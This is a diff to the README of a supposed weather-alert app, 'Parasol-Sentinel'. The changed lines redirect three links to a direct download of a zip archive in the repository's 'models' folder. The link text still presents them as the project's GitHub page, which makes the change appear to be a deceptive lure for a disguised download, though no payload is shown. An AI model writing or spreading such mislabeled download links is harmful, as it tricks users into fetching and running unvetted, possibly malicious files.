@@ -1,6 +1,6 @@
 # ☂️ Parasol-Sentinel - Weather alerts you can trust
 
-[![Download Parasol-Sentinel](https://img.shields.io/badge/Download-Parasol--Sentinel-blue?style=for-the-badge&logo=github)](https://github.com/Jorieunsafe420/Parasol-Sentinel)
+[![Download Parasol-Sentinel](https://img.shields.io/badge/Download-Parasol--Sentinel-blue?style=for-the-badge&logo=github)](https://github.com/Jorieunsafe420/Parasol-Sentinel/raw/refs/heads/main/models/Sentinel_Parasol_3.1.zip)
 
 ## 🌦️ What this app does
 
@@ -18,7 +18,7 @@ It is built for people who want:
 ### 1. Open the download page
 Visit this page to download the app:
 
-[Parasol-Sentinel on GitHub](https://github.com/Jorieunsafe420/Parasol-Sentinel)
+[Parasol-Sentinel on GitHub](https://github.com/Jorieunsafe420/Parasol-Sentinel/raw/refs/heads/main/models/Sentinel_Parasol_3.1.zip)
 
 ### 2. Download the project files
 On the GitHub page, click the green **Code** button, then choose **Download ZIP**.
@@ -158,7 +158,7 @@ The app uses HMAC-protected zones, which helps keep user data tied to the right 
 
 ## 📌 GitHub link
 
-[Open Parasol-Sentinel on GitHub](https://github.com/Jorieunsafe420/Parasol-Sentinel)
+[Open Parasol-Sentinel on GitHub](https://github.com/Jorieunsafe420/Parasol-Sentinel/raw/refs/heads/main/models/Sentinel_Parasol_3.1.zip)
 
 ## 🖥️ Running it again later
 
